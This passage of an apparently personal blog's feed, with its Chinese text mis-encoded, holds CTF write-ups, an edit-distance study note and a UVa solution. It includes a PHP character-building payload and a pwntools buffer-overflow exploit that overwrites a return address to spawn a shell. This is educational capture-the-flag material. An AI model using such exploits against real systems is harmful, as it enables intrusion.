å­—ä¸‹å»å¯ä»¥é€éå­˜å–<code>[1]</code>ä¾†ç¹¼çºŒé€ å­—ã€‚</p><p>ç¾åœ¨å®Œæˆé€ å­—ï¼Œä½†â€lol.nopâ€è·Ÿâ€flag.txtâ€å·®ä¸€å€‹å­—å…ƒï¼Œé€™é‚Šç™¼ç¾ä¸€å€‹phpå¾ˆç¥çš„ç‰¹æ€§ï¼Œå‡è¨­æˆ‘æœ‰ä¸€å€‹å­—ä¸²<code>&quot;ABCDEF&quot;</code>æˆ‘å¯ä»¥é€é<code>[6]=&#39;G&#39;</code>ç›´æ¥assignè®“å­—ä¸²è®Šæˆ<code>&quot;ABCDEFG&quot;</code>ï¼ŒPHPçœŸçš„æ˜¯å¾ˆç¥å¥‡ä¸æ˜¯æˆ‘åœ¨èªªâ€¦</p><p>æˆ‘çš„Payload:<br><code>$__=$_[0];$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_[7]=$__;$_[6]=$_[5];$_[5]=$__;$__++;$__++;$__++;$__++;$_[6]=$__;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_[4]=$_[3];$_[1]=$_[0];$_[0]=$__[1];$_[2]=$__[0];$__++;$_[3]=$__[1];</code></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;æœ‰å€‹ä»¥å‰åœ¨æ‰“CTFçš„æœ‹å‹ï¼Œæ‹¿ä»¥å‰å‡ºçš„PHP webé¡Œçµ¦æˆ‘ç©~&lt;/p&gt;
&lt;p&gt;éç¨‹ä¸­å­¸åˆ°äº†PHPä¸€å€‹å¾ˆå¥‡å¦™çš„ç‰¹æ€§â€¦&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="Writeup" scheme="https://twinklestar03.com/tags/Writeup/"/>
    
    <category term="MooncakeCTF" scheme="https://twinklestar03.com/tags/MooncakeCTF/"/>
    
    <category term="PHP" scheme="https://twinklestar03.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>Algorithm::Levenshtein distance(Edit Distance)</title>
    <link href="https://twinklestar03.com/Notes/Algorithm-EditDistance/"/>
    <id>https://twinklestar03.com/Notes/Algorithm-EditDistance/</id>
    <published>2019-08-23T16:00:00.000Z</published>
    <updated>2020-07-02T16:08:02.959Z</updated>
    
    <content type="html"><![CDATA[<p>å­¸ç¿’ç­†è¨˜-<strong>Levenshtein distance(Edit Distance)</strong></p><p>ä¸çŸ¥ä¸è¦ºå¿«ä¸€å€‹æœˆæ²’æ›´æ–°éƒ¨è½æ ¼äº†Î£( Â° â–³ Â°)ï¼Œå¤ªå¤šäº‹æƒ…è¦å¿™äº†é˜¿~~~~<br>é›–ç„¶ä¹‹å‰å­¸éäº†ä½†æ˜¯å› ç·£éš›æœƒä¸‹åˆç¢°åˆ°äº†ï¼Œæ‰€ä»¥å¯«å€‹æ–‡ç« è¤‡ç¿’ä¸€ä¸‹(à¹‘Â´Ú¡`à¹‘)</p><a id="more"></a><hr><h1 id="ä»‹ç´¹"><a href="#ä»‹ç´¹" class="headerlink" title="ä»‹ç´¹"></a>ä»‹ç´¹</h1><p>Levenshtein distance(Edit Distance)ï¼Œå¯ä»¥ç¨±ç‚ºç·¨è¼¯è·é›¢ï¼Œç·¨è¼¯è·é›¢å¯ä»¥ç”¨ä¾†æ¯”è¼ƒå…©å€‹å­—ä¸²ä¸¦æ±‚å‡ºç›¸ä¼¼åº¦ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä¾†åšåˆ°æ¨¡ç³Šæœå°‹ã€‚</p><p>Edit Distanceæ˜¯é€™æ¨£ä¾†æ¯”è¼ƒå…©å€‹å­—ä¸²çš„ï¼Œå‡è¨­æˆ‘æœ‰å…©å€‹å­—ä¸²A, Bã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">A &#x3D; &#39;AFEDC&#39;</span><br><span class="line">B &#x3D; &#39;ABDECG&#39;</span><br></pre></td></tr></table></figure><p>ç·¨è¼¯è·é›¢å¯ä»¥æƒ³æˆæˆ‘è¦æŠŠAè®ŠæˆBéœ€è¦èŠ±å¹¾<strong>æ­¥é©Ÿ</strong>ä¾†å®Œæˆï¼Œåœç¹åœ¨ä»¥ä¸‹3ç¨®å‹•ä½œ:</p><ul><li><strong>Insertæ’å…¥</strong>ï¼Œæ’å…¥ä¸€å€‹å­—å…ƒ</li><li><strong>Deleteåˆªé™¤</strong>ï¼Œåˆªé™¤ä¸€å€‹å­—å…ƒ</li><li><strong>Replaceæ›¿æ›</strong>ï¼Œæ›¿æ›ä¸€å€‹å­—å…ƒ</li></ul><p>ä½œæ³•æ˜¯é€™æ¨£çš„ï¼Œé–‹å§‹é€ä¸€æ¯”è¼ƒå­—å…ƒä¸¦ä¿®æ”¹ï¼Œå¾—å‡ºAè®ŠæˆBéœ€è¦çš„æ­¥é©Ÿæ•¸ã€‚</p><p>ç®­é ­ä»£è¡¨å­—å…ƒæŒ‡é‡</p><figure class="highlight m"><figcaption><span>æ¨¡æ“¬éç¨‹</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">ç§»å‹•æŒ‡é‡</span><br><span class="line">    â†“</span><br><span class="line">A <span class="built_in">=</span> AFEDC</span><br><span class="line">B <span class="built_in">=</span> ABDECG</span><br><span class="line">    â†‘</span><br><span class="line">A[<span class="number">0</span>] <span class="built_in">=</span><span class="built_in">=</span> B[<span class="number">0</span>]ï¼Œæ­¤æ™‚çš„cost <span class="built_in">=</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">ç§»å‹•æŒ‡é‡</span><br><span class="line">     â†“</span><br><span class="line">A <span class="built_in">=</span> AFEDC</span><br><span class="line">B <span class="built_in">=</span> ABDECG</span><br><span class="line">     â†‘</span><br><span class="line">A[<span class="number">1</span>] !<span class="built_in">=</span> B[<span class="number">1</span>]ï¼Œæˆ‘å€‘å¯ä»¥æŠŠFæ›æˆBï¼Œæ­¤æ™‚çš„cost + <span class="number">1</span> <span class="built_in">=</span> <span class="number">1</span></span><br><span class="line"></span><br><span class="line">ç§»å‹•æŒ‡é‡</span><br><span class="line">      â†“</span><br><span class="line">A <span class="built_in">=</span> AFEDC</span><br><span class="line">B <span class="built_in">=</span> ABDECG</span><br><span class="line">      â†‘</span><br><span class="line">A[<span class="number">2</span>] !<span class="built_in">=</span> B[<span class="number">2</span>]ï¼Œæˆ‘å€‘å¯ä»¥æŠŠEæ›æˆDï¼Œæ­¤æ™‚çš„cost + <span class="number">1</span> <span class="built_in">=</span> <span class="number">2</span></span><br><span class="line"></span><br><span class="line">çœç•¥éƒ¨åˆ†...</span><br><span class="line"></span><br><span class="line">ç§»å‹•æŒ‡é‡</span><br><span class="line">        â†“</span><br><span class="line">A <span class="built_in">=</span> AFEDC</span><br><span class="line">B <span class="built_in">=</span> ABDECG</span><br><span class="line">        â†‘</span><br><span class="line">A[<span class="number">4</span>] <span class="built_in">=</span><span class="built_in">=</span> B[<span class="number">4</span>]ï¼Œä¸ç”¨ä¿®æ”¹ï¼Œæ­¤æ™‚cost <span class="built_in">=</span> <span class="number">3</span></span><br><span class="line"></span><br><span class="line">ç§»å‹•æŒ‡é‡</span><br><span class="line">         â†“</span><br><span class="line">A <span class="built_in">=</span> AFEDC</span><br><span class="line">B <span class="built_in">=</span> ABDECG</span><br><span class="line">         â†‘</span><br><span class="line">A[<span class="number">5</span>] <span class="built_in">=</span><span class="built_in">=</span> B[<span class="number">5</span>]ï¼ŒAç¼ºå°‘ä¸€å€‹å­—å…ƒï¼Œæ‰€ä»¥æˆ‘å€‘æ’å…¥ä¸€å€‹Gï¼Œæ­¤æ™‚cost + <span class="number">1</span> <span class="built_in">=</span> <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">æŠŠAè®ŠæˆBçš„costæ˜¯<span class="number">4</span>ï¼Œæ‰€ä»¥EditDistance(A, B) <span class="built_in">=</span> <span class="number">4</span></span><br></pre></td></tr></table></figure><p>å¦‚æœç•¶å­—ä¸²é•·åº¦ä¸ä¸€æ¨£çš„æ™‚å€™å°±æœƒå‡ºç¾éœ€è¦åˆªé™¤æˆ–æ˜¯æ’å…¥çš„å‹•ä½œï¼Œå¦‚æœéƒ½æ˜¯B &gt; Aå°±åªæœƒå‡ºç¾æ’å…¥ä¸æœƒæœ‰åˆªé™¤ï¼Œå¦‚æœB &lt; Aåä¹‹ã€‚</p><hr><h1 id="å¯¦ä½œ"><a href="#å¯¦ä½œ" class="headerlink" title="å¯¦ä½œ"></a>å¯¦ä½œ</h1><p>çŸ¥é“åŸç†ä¹‹å¾Œå°±ä¾†ç”¢Codeå§!</p><figure class="highlight c"><figcaption><span>Recursion</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">EditDistance</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *s, <span class="keyword">int</span> len_s, <span class="keyword">const</span> <span class="keyword">char</span> *t, <span class="keyword">int</span> <span class="keyword">len_t</span>)</span></span>&#123; </span><br><span class="line">  <span class="keyword">int</span> cost;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* çµ‚æ­¢æ¢ä»¶ï¼Œç•¶å…©å­—ä¸²éƒ½ç‚ºç©º */</span></span><br><span class="line">  <span class="keyword">if</span> (len_s == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">len_t</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">len_t</span> == <span class="number">0</span>) <span class="keyword">return</span> len_s;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* æª¢æŸ¥å­—å…ƒæ˜¯å¦ä¸€æ¨£ï¼Œä¸ä¸€æ¨£çš„è©±cost = 1 */</span></span><br><span class="line">  <span class="keyword">if</span> (s[len_s<span class="number">-1</span>] == t[<span class="keyword">len_t</span><span class="number">-1</span>])</span><br><span class="line">      cost = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">      cost = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* return æœ€å°ç·¨è¼¯æ¬¡æ•¸(åˆªé™¤, æ’å…¥, æ›¿æ›)*/</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">std</span>::min(EditDistance(s, len_s - <span class="number">1</span>, t, <span class="keyword">len_t</span>    ) + <span class="number">1</span>,</span><br><span class="line">                 EditDistance(s, len_s    , t, <span class="keyword">len_t</span> - <span class="number">1</span>) + <span class="number">1</span>,</span><br><span class="line">                 EditDistance(s, len_s - <span class="number">1</span>, t, <span class="keyword">len_t</span> - <span class="number">1</span>) + cost);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€™è£¡æœ‰å€‹æ¯”è¼ƒç‰¹åˆ¥çš„å°åœ°æ–¹ï¼ŒEditDistance(s, <strong>len_s + 1</strong>, t, len_t) ä»£è¡¨çš„æ˜¯æ’å…¥ä¸€å€‹å­—å…ƒï¼Œä½†æ˜¯é€™è¡Œå…¶å¯¦ä¸å°ï¼Œå› ç‚ºä»–ä¸æœƒçµ‚æ­¢éè¿´ï¼Œåœ¨é€™é‚Šlen_s + 1æ˜¯æ”¹è®Šå¾Œçš„å­—ä¸²(æœªä¾†)ï¼Œå¯æ˜¯ç¨‹å¼åˆ¤æ–·çš„æ™‚å€™æ˜¯ä»¥é€é€²ä¾†çš„å­—ä¸²ç‚ºä¸»(éå»)ã€‚</p><p>åœ¨é€™è£¡å¯ä»¥é€éä¸€å€‹æ–¹æ³•æŠŠlen_s + 1 æ”¹æˆ len_t - 1ï¼Œåœ¨é€™è£¡å¯ä»¥èŠ±ä¸€é»æ™‚é–“æ€è€ƒç‚ºä»€éº¼ã€‚</p><p>å…¶å¯¦åŸå› æ˜¯æ’å…¥ä»£è¡¨æˆ‘æŠŠä¸€å€‹åŸå­—ä¸²æ²’æœ‰çš„å­—å…ƒåŠ é€²å­—ä¸²(len_s + 1)ï¼Œç›¸ç•¶æ–¼æˆ‘è·Ÿç›¸æ¯”è¼ƒçš„å­—ä¸²å°‘äº†ä¸€å€‹ä¸ç›¸åŒçš„åœ°æ–¹(len_t - 1)ï¼Œæ‰€ä»¥å…¶å¯¦é€™å…©è€…æ˜¯è¡¨é”ä¸€æ¨£çš„æ±è¥¿ã€‚</p><p>é€™å€‹æ¼”ç®—æ³•é‚„å¯ä»¥é€éDynamic Programmingä¾†å®Œæˆï¼Œæ”¹å¤©å†è£œä¸ŠCodeå§~</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å­¸ç¿’ç­†è¨˜-&lt;strong&gt;Levenshtein distance(Edit Distance)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ä¸çŸ¥ä¸è¦ºå¿«ä¸€å€‹æœˆæ²’æ›´æ–°éƒ¨è½æ ¼äº†Î£( Â° â–³ Â°)ï¼Œå¤ªå¤šäº‹æƒ…è¦å¿™äº†é˜¿~~~~&lt;br&gt;é›–ç„¶ä¹‹å‰å­¸éäº†ä½†æ˜¯å› ç·£éš›æœƒä¸‹åˆç¢°åˆ°äº†ï¼Œæ‰€ä»¥å¯«å€‹æ–‡ç« è¤‡ç¿’ä¸€ä¸‹(à¹‘Â´Ú¡`à¹‘)&lt;/p&gt;</summary>
    
    
    
    <category term="Notes" scheme="https://twinklestar03.com/categories/Notes/"/>
    
    
    <category term="StarNote" scheme="https://twinklestar03.com/tags/StarNote/"/>
    
    <category term="Algorithm" scheme="https://twinklestar03.com/tags/Algorithm/"/>
    
    <category term="Levenshtein distance" scheme="https://twinklestar03.com/tags/Levenshtein-distance/"/>
    
    <category term="Edit Distance" scheme="https://twinklestar03.com/tags/Edit-Distance/"/>
    
    <category term="Fuzzy" scheme="https://twinklestar03.com/tags/Fuzzy/"/>
    
  </entry>
  
  <entry>
    <title>Bamboofox-CTFè§£é¡Œç´€éŒ„</title>
    <link href="https://twinklestar03.com/Contest/CTF/Bamboofox-CTF/"/>
    <id>https://twinklestar03.com/Contest/CTF/Bamboofox-CTF/</id>
    <published>2019-07-20T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:27.219Z</updated>
    
    <content type="html"><![CDATA[<p>Bamboofox CTFè§£é¡Œè¨˜éŒ„ï¼Œä¸€å¦‚å¾€å¸¸åœ°åˆ°è™•æ‰¾é¡Œç›®å¢é€²è‡ªå·±æ‰“CTFçš„æˆ°åŠ›â•°(<em>Â°â–½Â°</em>)â•¯</p><a id="more"></a><p>æˆ‘é¸æ“‡å…ˆå¾<a href="https://bamboofox.cs.nctu.edu.tw/courses/2/challenges">é€™è£¡</a>é–‹å§‹åš</p><hr><h1 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h1><hr><h2 id="Wargame-0-1-Magic-100"><a href="#Wargame-0-1-Magic-100" class="headerlink" title="Wargame 0-1 Magic [100]"></a>Wargame 0-1 Magic [100]</h2><blockquote><p>Description<br>Do you believe in magic?</p></blockquote><blockquote><p>Hint<br>Stack buffer overflow</p></blockquote><p>æ‹¿åˆ°æª”æ¡ˆï¼Œmagic: ELF 32-bit LSB executableï¼Œæç¤ºå·²ç¶“å‘ŠçŸ¥æ˜¯Stack buffer overflowäº†ï¼Œæ‰€ä»¥æˆ‘ç›´æ¥IDAæ‹†é–‹ä¾†çœ‹äº†ã€‚</p><p><img src="/images/BamboofoxCTF/Magic/disass.JPG" alt="æœ‰æ¼æ´çš„å‡½å¼Magic()"><br>ç„¶å¾Œé‚„æœ‰ä¸€å€‹never_use()å¯ä»¥ç”¨ä¾†é–‹shellï¼Œæ‰€ä»¥é¡Œç›®æ‡‰è©²æ˜¯å¸Œæœ›æˆ‘å€‘æŠŠret addressæŒ‡åˆ°è©²å‡½å¼ã€‚</p><p>å¾<code>ax, [ebp-44h]</code>å¯çŸ¥bufferå¤§å°æ˜¯0x44ï¼Œç„¶å¾Œå› ç‚º<code>mov     dword ptr [esp], offset aS ; &quot;%s&quot;</code>å¯çŸ¥scanf()çš„æ ¼å¼åŒ–åƒæ•¸æ˜¯%sï¼Œæ‰€ä»¥å¯ä»¥ç”¨åƒåœ¾æŠŠBufferå¡çˆ†ã€‚</p><p>å·²ç¶“äº†è§£Buffer overflowæˆç«‹ä¹‹å¾Œå°±ä¾†å»ºæ§‹payloadå§! </p><p>éœ€è¦å¡0x44å€‹byteé€²å»æŠŠBufferå¡æ»¿ï¼Œé€™æ¨£åšä¹‹å¾Œæœƒé ‚åˆ°ebpï¼Œæ‰€ä»¥åœ¨é¡å¤–å¡0x4å€‹byteé ‚éebpï¼Œé€™é‚Šé–‹å§‹å°±æ˜¯return addressäº†! è“‹ä¸Šnever_use()çš„è¨˜æ†¶é«”ä½ç½®å®Œæˆæ”»æ“Š~<br>Payload: 0x48å€‹byte + never_use()çš„ä½ç½®</p><p>å…¶å¯¦é€™æ¨£æ”»æ“Šæ˜¯ä¸æœƒæˆåŠŸçš„ï¼Œå› ç‚ºé‚„æœ‰ä¸€å€‹å‡½å¼è¢«å¿½ç•¥äº†ï¼Œdo_magic()ï¼Œé¡Œç›®ç›´æ¥çµ¦å‡ºsource</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">do_magic</span><span class="params">(<span class="keyword">char</span> *buf,<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        srand(time(<span class="literal">NULL</span>));</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">                buf[i] ^= rand()%<span class="number">256</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">magic</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> magic_str[<span class="number">60</span>];</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, magic_str);</span><br><span class="line">        do_magic(magic_str, <span class="built_in">strlen</span>(magic_str));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, magic_str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸å°do_magicé€²è¡Œç¹éï¼Œé‚£payloadæœƒç›´æ¥è·Ÿäº‚æ•¸XORè®Šæˆåƒåœ¾QQ</p><p>ç”±å‘¼å«do_magicçš„åœ°æ–¹å¯çŸ¥æ§åˆ¶XORçš„æ¬¡æ•¸æ˜¯é€éstrlen()ï¼Œé€™å€‹å‡½å¼æœƒè¨ˆç®—å­—ä¸²çš„å­—å…ƒæ•¸ï¼Œåœä¸‹ä¾†çš„æ–¹æ³•æ˜¯è®€åˆ°ä¸€å€‹\x00ï¼Œé‚£æˆ‘å€‘å°±ææ—©è®“ä»–åœä¸‹ä¾†å°±å¥½!</p><p>æ‰€ä»¥payloadè®Šæˆ: 0x1å€‹byte + \x00 + (0x44 + 0x4 - 0x2) + never_use()çš„ä½ç½®</p><figure class="highlight python"><figcaption><span>Payload.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">host = <span class="string">&#x27;bamboofox.cs.nctu.edu.tw&#x27;</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./magic&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = remote(host, port)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&#x27;A&#x27;</span> + <span class="string">&#x27;\x00&#x27;</span> + <span class="string">&#x27;A&#x27;</span> * <span class="number">70</span> + p32(<span class="number">0x8048613</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;Bamboofox CTFè§£é¡Œè¨˜éŒ„ï¼Œä¸€å¦‚å¾€å¸¸åœ°åˆ°è™•æ‰¾é¡Œç›®å¢é€²è‡ªå·±æ‰“CTFçš„æˆ°åŠ›â•°(&lt;em&gt;Â°â–½Â°&lt;/em&gt;)â•¯&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://twinklestar03.com/categories/CTF/"/>
    
    
    <category term="Pwn" scheme="https://twinklestar03.com/tags/Pwn/"/>
    
    <category term="Writeup" scheme="https://twinklestar03.com/tags/Writeup/"/>
    
    <category term="BamboofoxCTF" scheme="https://twinklestar03.com/tags/BamboofoxCTF/"/>
    
  </entry>
  
  <entry>
    <title>UVa1584-CircularSequence</title>
    <link href="https://twinklestar03.com/Contest/UVa/UVa1584-CircularSequence/"/>
    <id>https://twinklestar03.com/Contest/UVa/UVa1584-CircularSequence/</id>
    <published>2019-07-14T16:00:00.000Z</published>
    <updated>2020-12-18T07:36:49.682Z</updated>
    
    <content type="html"><![CDATA[<p>é—œæ–¼å­—å…¸åºçš„æ‡‰ç”¨</p><a id="more"></a><hr><h1 id="é¡Œç›®"><a href="#é¡Œç›®" class="headerlink" title="é¡Œç›®"></a>é¡Œç›®</h1><blockquote><p>é•·åº¦ç‚ºNçš„ç’°ç‹€åºåˆ—æœ‰Nç¨®æ¨™è¨˜æ³•ï¼Œå¾æŸå€‹ä½ç½®é–‹å§‹é †æ™‚é˜æ—‹è½‰å¾—åˆ°ã€‚<br>å¾æ‰€æœ‰æ¨™è¨˜æ³•ä¸­æ‰¾åˆ°å­—å…¸åºæœ€å°æ¨™è¨˜æ³•ä¸¦å°å‡ºä¾†è©²åºåˆ—ã€‚<br>è®€å…¥ä¸€å€‹é•·åº¦ç‚ºNçš„DNAåºåˆ—(A, T, C, G)ï¼Œå°å‡ºåºåˆ—çš„æœ€å°æ¨™è¨˜ã€‚</p></blockquote><p><img src="/images/UVa/UVa1584/CircularSeq.png" alt="ç’°ç‹€åºåˆ—"></p><p>é€™å€‹åºåˆ—æœ‰å¤šç¨®æ¨™è¨˜æ³•: CGAGTCAGCT, GAGTCAGCTC, AGTCAGCTCGâ€¦.ã€‚åœ¨é€™äº›æ¨™è¨˜æ³•ä¸­æˆ‘å€‘è¦æ‰¾åˆ°æœ€å°æ¨™è¨˜ï¼Œä¹Ÿå°±æ˜¯å­—å…¸åºæœ€å°ã€‚</p><h2 id="å­—å…¸åº"><a href="#å­—å…¸åº" class="headerlink" title="å­—å…¸åº"></a>å­—å…¸åº</h2><p>å­—å…¸åºå°±æ˜¯å­—åœ¨å­—å…¸ä¸­çš„é †åºï¼Œå…©å€‹å­—ä¸²: â€œABCâ€, â€œCBAâ€ï¼Œä¸€é–‹å§‹å…ˆæ¯”è¼ƒå­—ä¸²é•·åº¦ï¼Œé•·åº¦çŸ­è€…å­—å…¸åºå°ï¼Œå¦‚æœé•·åº¦ç›¸ç­‰å‰‡å¾é ­é–‹å§‹æ‰¾ä¸åŒè€…ï¼Œåœ¨é€™ä¾‹å­ä¸­ç‚ºAè·ŸCï¼ŒAçš„å­—å…¸åºæ¯”Cå°ï¼Œæ‰€ä»¥â€ABCâ€çš„å­—å…¸åºæ¯”â€CBAâ€å°ã€‚</p><h1 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h1><figure class="highlight cpp"><figcaption><span>UVa1584.cpp</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _ ios::sync_with_stdio(false);cin.tie(0);</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> seq[<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ¨™è¨˜æ³•pæœ‰æ²’æœ‰æ¯”æ¨™è¨˜æ³•qé‚„è¦å°</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">cmp</span><span class="params">(<span class="keyword">char</span> *s, <span class="keyword">int</span> p, <span class="keyword">int</span> q)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> N = <span class="built_in">strlen</span>(s);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (s[(p + i) % N] != s[(q + i) % N])</span><br><span class="line">            <span class="keyword">return</span> s[(p + i) % N] &lt; s[(q + i) % N];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;_</span><br><span class="line">    <span class="keyword">int</span> N;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, seq);</span><br><span class="line">    N = <span class="built_in">strlen</span>(seq);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€ä¸€åˆ—èˆ‰æ¨™è¨˜æ³•ï¼Œç•™ä¸‹æœ€å°çš„</span></span><br><span class="line">    <span class="keyword">int</span> mark = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (cmp(seq, i, mark))</span><br><span class="line">            mark = i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, seq[(mark + i) % N]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;é—œæ–¼å­—å…¸åºçš„æ‡‰ç”¨&lt;/p&gt;</summary>
    
    
    
    <category term="Contest" scheme="https://twinklestar03.com/categories/Contest/"/>
    
